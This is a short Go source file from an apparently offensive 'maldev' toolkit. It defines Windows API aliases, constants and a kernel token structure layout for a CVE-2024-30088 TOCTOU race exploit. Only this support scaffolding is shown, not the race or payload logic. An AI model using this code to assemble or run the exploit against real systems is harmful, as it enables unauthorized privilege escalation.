//go:build windows

package cve202430088

import (
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
)

// Proc aliases from win/api — exploit-specific calls not wrapped elsewhere.
var (
	procVirtualAlloc            = api.Kernel32.NewProc("VirtualAlloc")
	procCreateThread            = api.ProcCreateThread
	procSetThreadPriority       = api.ProcSetThreadPriority
	procNtQueryInformationToken = api.ProcNtQueryInformationToken
)

// Windows constants not available in golang.org/x/sys/windows.
const (
	TokenAccessInformation        = 22
	THREAD_PRIORITY_TIME_CRITICAL = 15
)

// AuthzBasepSecurityAttributesInformation matches the kernel structure used by
// NtQueryInformationToken(TokenAccessInformation = 22). Exploit-specific —
// only meaningful in the context of the TOCTOU race.
type AuthzBasepSecurityAttributesInformation struct {
	SecurityAttributeCount        uint32        // +0x00
	_                             uint32        // +0x04 padding
	SecurityAttributesList        api.ListEntry // +0x08
	WorkingSecurityAttributeCount uint32        // +0x18
	_                             uint32        // +0x1C padding
	WorkingSecurityAttributesList api.ListEntry // +0x20
}

// Compile-time size assertions.
var _ [48]byte = [unsafe.Sizeof(AuthzBasepSecurityAttributesInformation{})]byte{}
